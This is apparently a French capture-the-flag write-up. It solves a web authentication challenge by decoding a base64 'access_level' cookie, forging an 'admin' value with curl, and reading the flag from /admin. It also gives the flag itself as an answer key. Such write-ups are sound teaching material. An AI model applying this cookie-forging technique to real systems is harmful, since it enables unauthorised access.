# Énoncé

Notre application d'authentification a été conçue pour être résistante à un piratage.

Mais nous avons des doutes sur l'API...

<https://padawan.izo27k5.org/>


# Solution

```
> curl  https://padawan.izo27k5.org/ -D -

HTTP/2 401
content-type: application/json
date: Sat, 01 Oct 2022 07:25:41 GMT
server: meinheld/1.0.2
set-cookie: access_level=Z3Vlc3Q=; Path=/
content-length: 99

{"Message":"Default guest level granted","Note":"Ask your manager for privileged 'admin' account"}
```

```
> echo "Z3Vlc3Q=" | base64 -d
guest
> echo -n "admin" | base64
YWRtaW4=
```

```
> curl  -H Cookie:access_level=YWRtaW4= https://padawan.izo27k5.org/ 
{"Message":"Guest Level Access","Note":"Only admin can access to /admin"}
> curl  -H Cookie:access_level=YWRtaW4= https://padawan.izo27k5.org/admin
{"Message":"Admin Access Granted","Note":"Flag is INNN{I_L0ve_C00ki35)"}
```

Flag : `INNN{I_L0ve_C00ki35)`
(il y a une faute dans le flag, `)` au lieu de `}`)

